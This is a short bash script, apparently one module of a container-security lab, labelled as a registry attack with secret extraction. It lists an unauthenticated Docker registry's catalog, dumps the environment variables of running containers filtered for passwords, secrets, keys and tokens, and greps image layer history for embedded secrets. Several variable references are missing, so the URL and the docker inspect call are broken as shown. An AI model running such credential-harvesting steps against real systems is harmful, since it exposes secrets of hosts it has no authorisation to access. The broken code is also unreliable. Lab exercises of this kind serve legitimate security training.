#!/usr/bin/env bash
# MODULE 7: Registry Attack + Secret Extraction
# Target: registry:5000 (no auth)

REGISTRY="registry:5000"

echo "[*] Enumerating registry catalog..."
curl -sf http:///v2/_catalog

echo "[*] Extracting secrets from container environments..."
docker ps -q | while read CID; do
  echo "--- Container:  ---"
  docker inspect --format '{{range .Config.Env}}{{println .}}{{end}}'  \
    | grep -iE "password|secret|key|token"
done

echo "[*] Scanning image layers for baked-in secrets..."
docker history vuln-web --no-trunc \
  | grep -iE "password|secret|key|ENV"
